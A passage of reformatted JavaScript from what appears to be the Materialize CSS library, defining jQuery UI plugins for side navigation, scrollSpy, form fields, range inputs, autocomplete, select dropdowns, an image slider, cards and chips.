                                right: "",
                                left: 0
                            }), a = !0) : (!a || s < -.3) && (e("body").css({
                                overflow: "",
                                width: ""
                            }), o.velocity({
                                translateX: [t.menuWidth + 10, u]
                            }, {
                                duration: 200,
                                queue: !1,
                                easing: "easeOutQuad"
                            }), n.velocity({
                                opacity: 0
                            }, {
                                duration: 200,
                                queue: !1,
                                easing: "easeOutQuad",
                                complete: function() {
                                    "function" == typeof t.onClose && t.onClose.call(this, o), e(this).remove()
                                }
                            }), r.css({
                                width: "10px",
                                right: 0,
                                left: ""
                            }))
                        }
                    }))), i.off("click.sidenav").on("click.sidenav", (function() {
                        if (!0 === a) a = !1, s();
                        else {
                            var i = e("body"),
                                n = e('<div id="sidenav-overlay"></div>'),
                                l = i.innerWidth();
                            i.css("overflow", "hidden"), i.width(l), e("body").append(r), "left" === t.edge ? (r.css({
                                width: "50%",
                                right: 0,
                                left: ""
                            }), o.velocity({
                                translateX: [0, -1 * t.menuWidth]
                            }, {
                                duration: 300,
                                queue: !1,
                                easing: "easeOutQuad"
                            })) : (r.css({
                                width: "50%",
                                right: "",
                                left: 0
                            }), o.velocity({
                                translateX: [0, t.menuWidth]
                            }, {
                                duration: 300,
                                queue: !1,
                                easing: "easeOutQuad"
                            })), n.css("opacity", 0).click((function() {
                                a = !1, s(), n.velocity({
                                    opacity: 0
                                }, {
                                    duration: 300,
                                    queue: !1,
                                    easing: "easeOutQuad",
                                    complete: function() {
                                        e(this).remove()
                                    }
                                })
                            })), e("body").append(n), n.velocity({
                                opacity: 1
                            }, {
                                duration: 300,
                                queue: !1,
                                easing: "easeOutQuad",
                                complete: function() {
                                    a = !0
                                }
                            }), "function" == typeof t.onOpen && t.onOpen.call(this, o)
                        }
                        return !1
                    }))
                }))
            },
            destroy: function() {
                var t = e("#sidenav-overlay"),
                    i = e('.drag-target[data-sidenav="' + e(this).attr("data-activates") + '"]');
                t.trigger("click"), i.remove(), e(this).off("click"), t.remove()
            },
            show: function() {
                this.trigger("click")
            },
            hide: function() {
                e("#sidenav-overlay").trigger("click")
            }
        };
        e.fn.sideNav = function(i) {
            return t[i] ? t[i].apply(this, Array.prototype.slice.call(arguments, 1)) : "object" != typeof i && i ? void e.error("Method " + i + " does not exist on jQuery.sideNav") : t.init.apply(this, arguments)
        }
    }(jQuery),
    function(e) {
        var t = e(window),
            i = [],
            n = [],
            o = !1,
            r = 0,
            s = {
                top: 0,
                right: 0,
                bottom: 0,
                left: 0
            };

        function a(o) {
            ++r;
            var a = t.scrollTop(),
                l = t.scrollLeft(),
                c = l + t.width(),
                u = a + t.height(),
                d = function(t, n, o, r) {
                    var s = e();
                    return e.each(i, (function(e, i) {
                        if (i.height() > 0) {
                            var a = i.offset().top,
                                l = i.offset().left,
                                c = l + i.width(),
                                u = a + i.height();
                            !(l > n || c < r || a > o || u < t) && s.push(i)
                        }
                    })), s
                }(a + s.top + o || 200, c + s.right, u + s.bottom, l + s.left);
            e.each(d, (function(e, t) {
                "number" != typeof t.data("scrollSpy:ticks") && t.triggerHandler("scrollSpy:enter"), t.data("scrollSpy:ticks", r)
            })), e.each(n, (function(e, t) {
                var i = t.data("scrollSpy:ticks");
                "number" == typeof i && i !== r && (t.triggerHandler("scrollSpy:exit"), t.data("scrollSpy:ticks", null))
            })), n = d
        }

        function l() {
            t.trigger("scrollSpy:winSize")
        }
        e.scrollSpy = function(n, r) {
            r = e.extend({
                throttle: 100,
                scrollOffset: 200,
                activeClass: "active",
                getActiveElement: function(e) {
                    return 'a[href="#' + e + '"]'
                }
            }, r);
            var l = [];
            (n = e(n)).each((function(t, n) {
                i.push(e(n)), e(n).data("scrollSpy:id", t), e('a[href="#' + e(n).attr("id") + '"]').click((function(t) {
                    t.preventDefault();
                    var i = e(Materialize.escapeHash(this.hash)).offset().top + 1;
                    e("html, body").animate({
                        scrollTop: i - r.scrollOffset
                    }, {
                        duration: 400,
                        queue: !1,
                        easing: "easeOutCubic"
                    })
                }))
            })), s.top = r.offsetTop || 0, s.right = r.offsetRight || 0, s.bottom = r.offsetBottom || 0, s.left = r.offsetLeft || 0;
            var c = Materialize.throttle((function() {
                    a(r.scrollOffset)
                }), r.throttle || 100),
                u = function() {
                    e(document).ready(c)
                };
            return o || (t.on("scroll", u), t.on("resize", u), o = !0), setTimeout(u, 0), n.on("scrollSpy:enter", (function() {
                l = e.grep(l, (function(e) {
                    return 0 != e.height()
                }));
                var t = e(this);
                l[0] ? (e(r.getActiveElement(l[0].attr("id"))).removeClass(r.activeClass), t.data("scrollSpy:id") < l[0].data("scrollSpy:id") ? l.unshift(e(this)) : l.push(e(this))) : l.push(e(this)), e(r.getActiveElement(l[0].attr("id"))).addClass(r.activeClass)
            })), n.on("scrollSpy:exit", (function() {
                if ((l = e.grep(l, (function(e) {
                        return 0 != e.height()
                    })))[0]) {
                    e(r.getActiveElement(l[0].attr("id"))).removeClass(r.activeClass);
                    var t = e(this);
                    (l = e.grep(l, (function(e) {
                        return e.attr("id") != t.attr("id")
                    })))[0] && e(r.getActiveElement(l[0].attr("id"))).addClass(r.activeClass)
                }
            })), n
        }, e.winSizeSpy = function(i) {
            return e.winSizeSpy = function() {
                return t
            }, i = i || {
                throttle: 100
            }, t.on("resize", Materialize.throttle(l, i.throttle || 100))
        }, e.fn.scrollSpy = function(t) {
            return e.scrollSpy(e(this), t)
        }
    }(jQuery),
    function(e) {
        e(document).ready((function() {
            Materialize.updateTextFields = function() {
                e("input[type=text], input[type=password], input[type=email], input[type=url], input[type=tel], input[type=number], input[type=search], textarea").each((function(t, i) {
                    var n = e(this);
                    e(i).val().length > 0 || e(i).is(":focus") || i.autofocus || void 0 !== n.attr("placeholder") ? n.siblings("label").addClass("active") : e(i)[0].validity ? n.siblings("label").toggleClass("active", !0 === e(i)[0].validity.badInput) : n.siblings("label").removeClass("active")
                }))
            };
            var t = "input[type=text], input[type=password], input[type=email], input[type=url], input[type=tel], input[type=number], input[type=search], textarea";
            e(document).on("change", t, (function() {
                0 === e(this).val().length && void 0 === e(this).attr("placeholder") || e(this).siblings("label").addClass("active"), validate_field(e(this))
            })), e(document).ready((function() {
                Materialize.updateTextFields()
            })), e(document).on("reset", (function(i) {
                var n = e(i.target);
                n.is("form") && (n.find(t).removeClass("valid").removeClass("invalid"), n.find(t).each((function() {
                    "" === e(this).attr("value") && e(this).siblings("label").removeClass("active")
                })), n.find("select.initialized").each((function() {
                    var e = n.find("option[selected]").text();
                    n.siblings("input.select-dropdown").val(e)
                })))
            })), e(document).on("focus", t, (function() {
                e(this).siblings("label, .prefix").addClass("active")
            })), e(document).on("blur", t, (function() {
                var t = e(this),
                    i = ".prefix";
                0 === t.val().length && !0 !== t[0].validity.badInput && void 0 === t.attr("placeholder") && (i += ", label"), t.siblings(i).removeClass("active"), validate_field(t)
            })), window.validate_field = function(e) {
                var t = void 0 !== e.attr("data-length"),
                    i = parseInt(e.attr("data-length")),
                    n = e.val().length;
                0 !== e.val().length || !1 !== e[0].validity.badInput || e.is(":required") ? e.hasClass("validate") && (e.is(":valid") && t && n <= i || e.is(":valid") && !t ? (e.removeClass("invalid"), e.addClass("valid")) : (e.removeClass("valid"), e.addClass("invalid"))) : e.hasClass("validate") && (e.removeClass("valid"), e.removeClass("invalid"))
            }, e(document).on("keyup.radio", "input[type=radio], input[type=checkbox]", (function(t) {
                if (9 === t.which) return e(this).addClass("tabbed"), void e(this).one("blur", (function(t) {
                    e(this).removeClass("tabbed")
                }))
            }));
            var i = e(".hiddendiv").first();
            i.length || (i = e('<div class="hiddendiv common"></div>'), e("body").append(i));
            var n = ".materialize-textarea";
            e(n).each((function() {
                var t = e(this);
                t.data("original-height", t.height()), t.data("previous-length", t.val().length)
            })), e("body").on("keyup keydown autoresize", n, (function() {
                ! function(t) {
                    var n = t.css("font-family"),
                        o = t.css("font-size"),
                        r = t.css("line-height"),
                        s = t.css("padding");
                    o && i.css("font-size", o), n && i.css("font-family", n), r && i.css("line-height", r), s && i.css("padding", s), t.data("original-height") || t.data("original-height", t.height()), "off" === t.attr("wrap") && i.css("overflow-wrap", "normal").css("white-space", "pre"), i.text(t.val() + "\n");
                    var a = i.html().replace(/\n/g, "<br>");
                    i.html(a), t.is(":visible") ? i.css("width", t.width()) : i.css("width", e(window).width() / 2), t.data("original-height") <= i.height() ? t.css("height", i.height()) : t.val().length < t.data("previous-length") && t.css("height", t.data("original-height")), t.data("previous-length", t.val().length)
                }(e(this))
            })), e(document).on("change", '.file-field input[type="file"]', (function() {
                for (var t = e(this).closest(".file-field").find("input.file-path"), i = e(this)[0].files, n = [], o = 0; o < i.length; o++) n.push(i[o].name);
                t.val(n.join(", ")), t.trigger("change")
            }));
            var o = "input[type=range]",
                r = !1;
            e(o).each((function() {
                var t = e('<span class="thumb"><span class="value"></span></span>');
                e(this).after(t)
            }));
            var s = function(e) {
                    var t = -7 + parseInt(e.parent().css("padding-left")) + "px";
                    e.velocity({
                        height: "30px",
                        width: "30px",
                        top: "-30px",
                        marginLeft: t
                    }, {
                        duration: 300,
                        easing: "easeOutExpo"
                    })
                },
                a = function(e) {
                    var t = e.width() - 15,
                        i = parseFloat(e.attr("max")),
                        n = parseFloat(e.attr("min"));
                    return (parseFloat(e.val()) - n) / (i - n) * t
                },
                l = ".range-field";
            e(document).on("change", o, (function(t) {
                var i = e(this).siblings(".thumb");
                i.find(".value").html(e(this).val()), i.hasClass("active") || s(i);
                var n = a(e(this));
                i.addClass("active").css("left", n)
            })), e(document).on("mousedown touchstart", o, (function(t) {
                var i = e(this).siblings(".thumb");
                if (i.length <= 0 && (i = e('<span class="thumb"><span class="value"></span></span>'), e(this).after(i)), i.find(".value").html(e(this).val()), r = !0, e(this).addClass("active"), i.hasClass("active") || s(i), "input" !== t.type) {
                    var n = a(e(this));
                    i.addClass("active").css("left", n)
                }
            })), e(document).on("mouseup touchend", l, (function() {
                r = !1, e(this).removeClass("active")
            })), e(document).on("input mousemove touchmove", l, (function(t) {
                var i = e(this).children(".thumb"),
                    n = e(this).find(o);
                if (r) {
                    i.hasClass("active") || s(i);
                    var l = a(n);
                    i.addClass("active").css("left", l), i.find(".value").html(i.siblings(o).val())
                }
            })), e(document).on("mouseout touchleave", l, (function() {
                if (!r) {
                    var t = e(this).children(".thumb"),
                        i = 7 + parseInt(e(this).css("padding-left")) + "px";
                    t.hasClass("active") && t.velocity({
                        height: "0",
                        width: "0",
                        top: "10px",
                        marginLeft: i
                    }, {
                        duration: 100
                    }), t.removeClass("active")
                }
            })), e.fn.autocomplete = function(t) {
                return t = e.extend({
                    data: {},
                    limit: 1 / 0,
                    onAutocomplete: null,
                    minLength: 1
                }, t), this.each((function() {
                    var i, n = e(this),
                        o = t.data,
                        r = 0,
                        s = -1,
                        a = n.closest(".input-field");
                    if (e.isEmptyObject(o)) n.off("keyup.autocomplete focus.autocomplete");
                    else {
                        var l, c = e('<ul class="autocomplete-content dropdown-content"></ul>');
                        a.length ? (l = a.children(".autocomplete-content.dropdown-content").first()).length || a.append(c) : (l = n.next(".autocomplete-content.dropdown-content")).length || n.after(c), l.length && (c = l);
                        var u = function() {
                            c.empty(), s = -1, c.find(".active").removeClass("active"), i = void 0
                        };
                        n.off("blur.autocomplete").on("blur.autocomplete", (function() {
                            u()
                        })), n.off("keyup.autocomplete focus.autocomplete").on("keyup.autocomplete focus.autocomplete", (function(s) {
                            r = 0;
                            var a = n.val().toLowerCase();
                            if (13 !== s.which && 38 !== s.which && 40 !== s.which) {
                                if (i !== a && (u(), a.length >= t.minLength))
                                    for (var l in o)
                                        if (o.hasOwnProperty(l) && -1 !== l.toLowerCase().indexOf(a)) {
                                            if (r >= t.limit) break;
                                            var d = e("<li></li>");
                                            o[l] ? d.append('<img src="' + o[l] + '" class="right circle"><span>' + l + "</span>") : d.append("<span>" + l + "</span>"), c.append(d), p = a, void 0, void 0, void 0, void 0, void 0, void 0, h = (f = d).find("img"), g = (v = f.text().toLowerCase().indexOf("" + p.toLowerCase())) + p.length - 1, m = f.text().slice(0, v), y = f.text().slice(v, g + 1), b = f.text().slice(g + 1), f.html("<span>" + m + "<span class='highlight'>" + y + "</span>" + b + "</span>"), h.length && f.prepend(h), r++
                                        } var p, f, h, v, g, m, y, b;
                                i = a
                            }
                        })), n.off("keydown.autocomplete").on("keydown.autocomplete", (function(e) {
                            var t, i = e.which,
                                n = c.children("li").length,
                                o = c.children(".active").first();
                            13 === i && s >= 0 ? (t = c.children("li").eq(s)).length && (t.trigger("mousedown.autocomplete"), e.preventDefault()) : 38 !== i && 40 !== i || (e.preventDefault(), 38 === i && s > 0 && s--, 40 === i && s < n - 1 && s++, o.removeClass("active"), s >= 0 && c.children("li").eq(s).addClass("active"))
                        })), c.off("mousedown.autocomplete touchstart.autocomplete").on("mousedown.autocomplete touchstart.autocomplete", "li", (function() {
                            var i = e(this).text().trim();
                            n.val(i), n.trigger("change"), u(), "function" == typeof t.onAutocomplete && t.onAutocomplete.call(this, i)
                        }))
                    }
                }))
            }
        })), e.fn.material_select = function(t) {
            function i(e, t, i) {
                var n = e.indexOf(t),
                    o = -1 === n;
                return o ? e.push(t) : e.splice(n, 1), i.siblings("ul.dropdown-content").find("li:not(.optgroup)").eq(t).toggleClass("active"), i.find("option").eq(t).prop("selected", o),
                    function(e, t) {
                        for (var i = "", n = 0, o = e.length; n < o; n++) {
                            var r = t.find("option").eq(e[n]).text();
                            i += 0 === n ? r : ", " + r
                        }
                        "" === i && (i = t.find("option:disabled").eq(0).text()), t.siblings("input.select-dropdown").val(i)
                    }(e, i), o
            }
            e(this).each((function() {
                var n = e(this);
                if (!n.hasClass("browser-default")) {
                    var o = !!n.attr("multiple"),
                        r = n.attr("data-select-id");
                    if (r && (n.parent().find("span.caret").remove(), n.parent().find("input").remove(), n.unwrap(), e("ul#select-options-" + r).remove()), "destroy" === t) return n.removeAttr("data-select-id").removeClass("initialized"), void e(window).off("click.select");
                    var s = Materialize.guid();
                    n.attr("data-select-id", s);
                    var a = e('<div class="select-wrapper"></div>');
                    a.addClass(n.attr("class")), n.is(":disabled") && a.addClass("disabled");
                    var l = e('<ul id="select-options-' + s + '" class="dropdown-content select-dropdown ' + (o ? "multiple-select-dropdown" : "") + '"></ul>'),
                        c = n.children("option, optgroup"),
                        u = [],
                        d = !1,
                        p = n.find("option:selected").html() || n.find("option:first").html() || "",
                        f = function(t, i, n) {
                            var r = i.is(":disabled") ? "disabled " : "",
                                s = "optgroup-option" === n ? "optgroup-option " : "",
                                a = o ? '<input type="checkbox"' + r + "/><label></label>" : "",
                                c = i.data("icon"),
                                u = i.attr("class");
                            if (c) {
                                var d = "";
                                return u && (d = ' class="' + u + '"'), l.append(e('<li class="' + r + s + '"><img alt="" src="' + c + '"' + d + "><span>" + a + i.html() + "</span></li>")), !0
                            }
                            l.append(e('<li class="' + r + s + '"><span>' + a + i.html() + "</span></li>"))
                        };
                    c.length && c.each((function() {
                        if (e(this).is("option")) o ? f(0, e(this), "multiple") : f(0, e(this));
                        else if (e(this).is("optgroup")) {
                            var t = e(this).children("option");
                            l.append(e('<li class="optgroup"><span>' + e(this).attr("label") + "</span></li>")), t.each((function() {
                                f(0, e(this), "optgroup-option")
                            }))
                        }
                    })), l.find("li:not(.optgroup)").each((function(r) {
                        e(this).click((function(s) {
                            if (!e(this).hasClass("disabled") && !e(this).hasClass("optgroup")) {
                                var a = !0;
                                o ? (e('input[type="checkbox"]', this).prop("checked", (function(e, t) {
                                    return !t
                                })), a = i(u, r, n), g.trigger("focus")) : (l.find("li").removeClass("active"), e(this).toggleClass("active"), g.val(e(this).text())), m(l, e(this)), n.find("option").eq(r).prop("selected", a), n.trigger("change"), void 0 !== t && t()
                            }
                            s.stopPropagation()
                        }))
                    })), n.wrap(a);
                    var h = e('<span class="caret">&#9660;</span>'),
                        v = p.replace(/"/g, "&quot;"),
                        g = e('<input type="text" class="select-dropdown" readonly="true" ' + (n.is(":disabled") ? "disabled" : "") + ' data-activates="select-options-' + s + '" value="' + v + '"/>');
                    n.before(g), g.before(h), g.after(l), n.is(":disabled") || g.dropdown({
                        hover: !1
                    }), n.attr("tabindex") && e(g[0]).attr("tabindex", n.attr("tabindex")), n.addClass("initialized"), g.on({
                        focus: function() {
                            if (e("ul.select-dropdown").not(l[0]).is(":visible") && (e("input.select-dropdown").trigger("close"), e(window).off("click.select")), !l.is(":visible")) {
                                e(this).trigger("open", ["focus"]);
                                var t = e(this).val();
                                o && t.indexOf(",") >= 0 && (t = t.split(",")[0]);
                                var i = l.find("li").filter((function() {
                                    return e(this).text().toLowerCase() === t.toLowerCase()
                                }))[0];
                                m(l, i, !0), e(window).off("click.select").on("click.select", (function() {
                                    o && (d || g.trigger("close")), e(window).off("click.select")
                                }))
                            }
                        },
                        click: function(e) {
                            e.stopPropagation()
                        }
                    }), g.on("blur", (function() {
                        o || (e(this).trigger("close"), e(window).off("click.select")), l.find("li.selected").removeClass("selected")
                    })), l.hover((function() {
                        d = !0
                    }), (function() {
                        d = !1
                    })), o && n.find("option:selected:not(:disabled)").each((function() {
                        var e = this.index;
                        i(u, e, n), l.find("li:not(.optgroup)").eq(e).find(":checkbox").prop("checked", !0)
                    }));
                    var m = function(t, i, n) {
                            if (i) {
                                t.find("li.selected").removeClass("selected");
                                var r = e(i);
                                r.addClass("selected"), o && !n || l.scrollTo(r)
                            }
                        },
                        y = [];
                    g.on("keydown", (function(t) {
                        if (9 != t.which)
                            if (40 != t.which || l.is(":visible")) {
                                if (13 != t.which || l.is(":visible")) {
                                    t.preventDefault();
                                    var i = String.fromCharCode(t.which).toLowerCase();
                                    if (i && -1 === [9, 13, 27, 38, 40].indexOf(t.which)) {
                                        y.push(i);
                                        var n = y.join(""),
                                            r = l.find("li").filter((function() {
                                                return 0 === e(this).text().toLowerCase().indexOf(n)
                                            }))[0];
                                        r && m(l, r)
                                    }
                                    if (13 == t.which) {
                                        var s = l.find("li.selected:not(.disabled)")[0];
                                        s && (e(s).trigger("click"), o || g.trigger("close"))
                                    }
                                    40 == t.which && (r = l.find("li.selected").length ? l.find("li.selected").next("li:not(.disabled)")[0] : l.find("li:not(.disabled)")[0], m(l, r)), 27 == t.which && g.trigger("close"), 38 == t.which && (r = l.find("li.selected").prev("li:not(.disabled)")[0]) && m(l, r), setTimeout((function() {
                                        y = []
                                    }), 1e3)
                                }
                            } else g.trigger("open");
                        else g.trigger("close")
                    }))
                }
            }))
        }
    }(jQuery),
    function(e) {
        var t = {
            init: function(t) {
                return t = e.extend({
                    indicators: !0,
                    height: 400,
                    transition: 500,
                    interval: 6e3
                }, t), this.each((function() {
                    var i, n, o, r = e(this),
                        s = r.find("ul.slides").first(),
                        a = s.find("> li"),
                        l = s.find(".active").index();

                    function c(e, t) {
                        e.hasClass("center-align") ? e.velocity({
                            opacity: 0,
                            translateY: -100
                        }, {
                            duration: t,
                            queue: !1
                        }) : e.hasClass("right-align") ? e.velocity({
                            opacity: 0,
                            translateX: 100
                        }, {
                            duration: t,
                            queue: !1
                        }) : e.hasClass("left-align") && e.velocity({
                            opacity: 0,
                            translateX: -100
                        }, {
                            duration: t,
                            queue: !1
                        })
                    }

                    function u(e) {
                        e >= a.length ? e = 0 : e < 0 && (e = a.length - 1), (l = s.find(".active").index()) != e && (i = a.eq(l), $caption = i.find(".caption"), i.removeClass("active"), i.velocity({
                            opacity: 0
                        }, {
                            duration: t.transition,
                            queue: !1,
                            easing: "easeOutQuad",
                            complete: function() {
                                a.not(".active").velocity({
                                    opacity: 0,
                                    translateX: 0,
                                    translateY: 0
                                }, {
                                    duration: 0,
                                    queue: !1
                                })
                            }
                        }), c($caption, t.transition), t.indicators && n.eq(l).removeClass("active"), a.eq(e).velocity({
                            opacity: 1
                        }, {
                            duration: t.transition,
                            queue: !1,
                            easing: "easeOutQuad"
                        }), a.eq(e).find(".caption").velocity({
                            opacity: 1,
                            translateX: 0,
                            translateY: 0
                        }, {
                            duration: t.transition,
                            delay: t.transition,
                            queue: !1,
                            easing: "easeOutQuad"
                        }), a.eq(e).addClass("active"), t.indicators && n.eq(e).addClass("active"))
                    } - 1 != l && (i = a.eq(l)), r.hasClass("fullscreen") || (t.indicators ? r.height(t.height + 40) : r.height(t.height), s.height(t.height)), a.find(".caption").each((function() {
                        c(e(this), 0)
                    })), a.find("img").each((function() {
                        var t = "data:image/gif;base64,R0lGODlhAQABAIABAP///wAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==";
                        e(this).attr("src") !== t && (e(this).css("background-image", 'url("' + e(this).attr("src") + '")'), e(this).attr("src", t))
                    })), t.indicators && (n = e('<ul class="indicators"></ul>'), a.each((function(i) {
                        var r = e('<li class="indicator-item"></li>');
                        r.click((function() {
                            u(s.parent().find(e(this)).index()), clearInterval(o), o = setInterval((function() {
                                l = s.find(".active").index(), a.length == l + 1 ? l = 0 : l += 1, u(l)
                            }), t.transition + t.interval)
                        })), n.append(r)
                    })), r.append(n), n = r.find("ul.indicators").find("li.indicator-item")), i ? i.show() : (a.first().addClass("active").velocity({
                        opacity: 1
                    }, {
                        duration: t.transition,
                        queue: !1,
                        easing: "easeOutQuad"
                    }), l = 0, i = a.eq(l), t.indicators && n.eq(l).addClass("active")), i.find("img").each((function() {
                        i.find(".caption").velocity({
                            opacity: 1,
                            translateX: 0,
                            translateY: 0
                        }, {
                            duration: t.transition,
                            queue: !1,
                            easing: "easeOutQuad"
                        })
                    })), o = setInterval((function() {
                        u((l = s.find(".active").index()) + 1)
                    }), t.transition + t.interval);
                    var d = !1,
                        p = !1;
                    r.hammer({
                        prevent_default: !1
                    }).on("pan", (function(e) {
                        if ("touch" === e.gesture.pointerType) {
                            clearInterval(o);
                            var t, i = e.gesture.direction,
                                n = e.gesture.deltaX,
                                l = e.gesture.velocityX,
                                c = e.gesture.velocityY;
                            $curr_slide = s.find(".active"), Math.abs(l) > Math.abs(c) && $curr_slide.velocity({
                                translateX: n
                            }, {
                                duration: 50,
                                queue: !1,
                                easing: "easeOutQuad"
                            }), 4 === i && (n > r.innerWidth() / 2 || l < -.65) ? p = !0 : 2 === i && (n < -1 * r.innerWidth() / 2 || l > .65) && (d = !0), d && (0 === (t = $curr_slide.next()).length && (t = a.first()), t.velocity({
                                opacity: 1
                            }, {
                                duration: 300,
                                queue: !1,
                                easing: "easeOutQuad"
                            })), p && (0 === (t = $curr_slide.prev()).length && (t = a.last()), t.velocity({
                                opacity: 1
                            }, {
                                duration: 300,
                                queue: !1,
                                easing: "easeOutQuad"
                            }))
                        }
                    })).on("panend", (function(e) {
                        "touch" === e.gesture.pointerType && ($curr_slide = s.find(".active"), curr_index = s.find(".active").index(), !p && !d || a.length <= 1 ? $curr_slide.velocity({
                            translateX: 0
                        }, {
                            duration: 300,
                            queue: !1,
                            easing: "easeOutQuad"
                        }) : d ? (u(curr_index + 1), $curr_slide.velocity({
                            translateX: -1 * r.innerWidth()
                        }, {
                            duration: 300,
                            queue: !1,
                            easing: "easeOutQuad",
                            complete: function() {
                                $curr_slide.velocity({
                                    opacity: 0,
                                    translateX: 0
                                }, {
                                    duration: 0,
                                    queue: !1
                                })
                            }
                        })) : p && (u(curr_index - 1), $curr_slide.velocity({
                            translateX: r.innerWidth()
                        }, {
                            duration: 300,
                            queue: !1,
                            easing: "easeOutQuad",
                            complete: function() {
                                $curr_slide.velocity({
                                    opacity: 0,
                                    translateX: 0
                                }, {
                                    duration: 300,
                                    queue: !1
                                })
                            }
                        })), d = !1, p = !1, clearInterval(o), o = setInterval((function() {
                            l = s.find(".active").index(), a.length == l + 1 ? l = 0 : l += 1, u(l)
                        }), t.transition + t.interval))
                    })), r.on("sliderPause", (function() {
                        clearInterval(o)
                    })), r.on("sliderStart", (function() {
                        clearInterval(o), o = setInterval((function() {
                            l = s.find(".active").index(), a.length == l + 1 ? l = 0 : l += 1, u(l)
                        }), t.transition + t.interval)
                    })), r.on("sliderNext", (function() {
                        u((l = s.find(".active").index()) + 1)
                    })), r.on("sliderPrev", (function() {
                        u((l = s.find(".active").index()) - 1)
                    }))
                }))
            },
            pause: function() {
                e(this).trigger("sliderPause")
            },
            start: function() {
                e(this).trigger("sliderStart")
            },
            next: function() {
                e(this).trigger("sliderNext")
            },
            prev: function() {
                e(this).trigger("sliderPrev")
            }
        };
        e.fn.slider = function(i) {
            return t[i] ? t[i].apply(this, Array.prototype.slice.call(arguments, 1)) : "object" != typeof i && i ? void e.error("Method " + i + " does not exist on jQuery.tooltip") : t.init.apply(this, arguments)
        }
    }(jQuery),
    function(e) {
        e(document).ready((function() {
            e(document).on("click.card", ".card", (function(t) {
                if (e(this).find("> .card-reveal").length) {
                    var i = e(t.target).closest(".card");
                    void 0 === i.data("initialOverflow") && i.data("initialOverflow", void 0 === i.css("overflow") ? "" : i.css("overflow")), e(t.target).is(e(".card-reveal .card-title")) || e(t.target).is(e(".card-reveal .card-title i")) ? e(this).find(".card-reveal").velocity({
                        translateY: 0
                    }, {
                        duration: 225,
                        queue: !1,
                        easing: "easeInOutQuad",
                        complete: function() {
                            e(this).css({
                                display: "none"
                            }), i.css("overflow", i.data("initialOverflow"))
                        }
                    }) : (e(t.target).is(e(".card .activator")) || e(t.target).is(e(".card .activator i"))) && (i.css("overflow", "hidden"), e(this).find(".card-reveal").css({
                        display: "block"
                    }).velocity("stop", !1).velocity({
                        translateY: "-100%"
                    }, {
                        duration: 300,
                        queue: !1,
                        easing: "easeInOutQuad"
                    }))
                }
            }))
        }))
    }(jQuery),
    function(e) {
        var t = {
            data: [],
            placeholder: "",
            secondaryPlaceholder: "",
            autocompleteOptions: {}
        };
        e(document).ready((function() {
            e(document).on("click", ".chip .close", (function(t) {
                e(this).closest(".chips").attr("data-initialized") || e(this).closest(".chip").remove()
            }))
        })), e.fn.material_chip = function(i) {
            var n = this;
            if (this.$el = e(this), this.$document = e(document), this.SELS = {
                    CHIPS: ".chips",
                    CHIP: ".chip",
                    INPUT: "input",
                    DELETE: ".material-icons",
                    SELECTED_CHIP: ".selected"
                }, "data" === i) return this.$el.data("chips");
            var o = e.extend({}, t, i);
            n.hasAutocomplete = !e.isEmptyObject(o.autocompleteOptions.data), this.init = function() {
                var t = 0;
                n.$el.each((function() {
                    var i = e(this),
                        r = Materialize.guid();
                    n.chipId = r, o.data && o.data instanceof Array || (o.data = []), i.data("chips", o.data), i.attr("data-index", t), i.attr("data-initialized", !0), i.hasClass(n.SELS.CHIPS) || i.addClass("chips"), n.chips(i, r), t++
                }))
            }, this.handleEvents = function() {
                var t = n.SELS;
                n.$document.off("click.chips-focus", t.CHIPS).on("click.chips-focus", t.CHIPS, (function(i) {
                    e(i.target).find(t.INPUT).focus()
                })), n.$document.off("click.chips-select", t.CHIP).on("click.chips-select", t.CHIP, (function(i) {
                    var o = e(i.target);
                    if (o.length) {
                        var r = o.hasClass("selected"),
                            s = o.closest(t.CHIPS);
                        e(t.CHIP).removeClass("selected"), r || n.selectChip(o.index(), s)
                    }
                })), n.$document.off("keydown.chips").on("keydown.chips", (function(i) {
                    if (!e(i.target).is("input, textarea")) {
                        var o, r = n.$document.find(t.CHIP + t.SELECTED_CHIP),
                            s = r.closest(t.CHIPS),
                            a = r.siblings(t.CHIP).length;
                        if (r.length)
                            if (8 === i.which || 46 === i.which) {
                                i.preventDefault(), o = r.index(), n.deleteChip(o, s);
                                var l = null;
                                o + 1 < a ? l = o : o !== a && o + 1 !== a || (l = a - 1), l < 0 && (l = null), null !== l && n.selectChip(l, s), a || s.find("input").focus()
                            } else if (37 === i.which) {
                            if ((o = r.index() - 1) < 0) return;
                            e(t.CHIP).removeClass("selected"), n.selectChip(o, s)
                        } else if (39 === i.which) {
                            if (o = r.index() + 1, e(t.CHIP).removeClass("selected"), o > a) return void s.find("input").focus();
                            n.selectChip(o, s)
                        }
                    }
                })), n.$document.off("focusin.chips", t.CHIPS + " " + t.INPUT).on("focusin.chips", t.CHIPS + " " + t.INPUT, (function(i) {
                    var n = e(i.target).closest(t.CHIPS);
                    n.addClass("focus"), n.siblings("label, .prefix").addClass("active"), e(t.CHIP).removeClass("selected")
                })), n.$document.off("focusout.chips", t.CHIPS + " " + t.INPUT).on("focusout.chips", t.CHIPS + " " + t.INPUT, (function(i) {
                    var n = e(i.target).closest(t.CHIPS);
                    n.removeClass("focus"), void 0 !== n.data("chips") && n.data("chips").length || n.siblings("label").removeClass("active"), n.siblings(".prefix").removeClass("active")
                })), n.$document.off("keydown.chips-add", t.CHIPS + " " + t.INPUT).on("keydown.chips-add", t.CHIPS + " " + t.INPUT, (function(i) {
                    var o = e(i.target),
                        r = o.closest(t.CHIPS),
                        s = r.children(t.CHIP).length;
                    if (13 === i.which) {
                        if (n.hasAutocomplete && r.find(".autocomplete-content.dropdown-content").length && r.find(".autocomplete-content.dropdown-content").children().length) return;
                        return i.preventDefault(), n.addChip({
                            tag: o.val()
                        }, r), void o.val("")
                    }
                    if ((8 === i.keyCode || 37 === i.keyCode) && "" === o.val() && s) return i.preventDefault(), n.selectChip(s - 1, r), void o.blur()
                })), n.$document.off("click.chips-delete", t.CHIPS + " " + t.DELETE).on("click.chips-delete", t.CHIPS + " " + t.DELETE, (function(i) {
                    var o = e(i.target),
                        r = o.closest(t.CHIPS),
                        s = o.closest(t.CHIP);
                    i.stopPropagation(), n.deleteChip(s.index(), r), r.find("input").focus()
                }))
            }, this.chips = function(t, i) {
                t.empty(), t.data("chips").forEach((function(e) {
                    t.append(n.renderChip(e))
                })), t.append(e('<input id="' + i + '" class="input" placeholder="">')), n.setPlaceholder(t);
                var r = t.next("label");
                r.length && (r.attr("for", i), void 0 !== t.data("chips") && t.data("chips").length && r.addClass("active"));
                var s = e("#" + i);
                n.hasAutocomplete && (o.autocompleteOptions.onAutocomplete = function(e) {
                    n.addChip({
                        tag: e
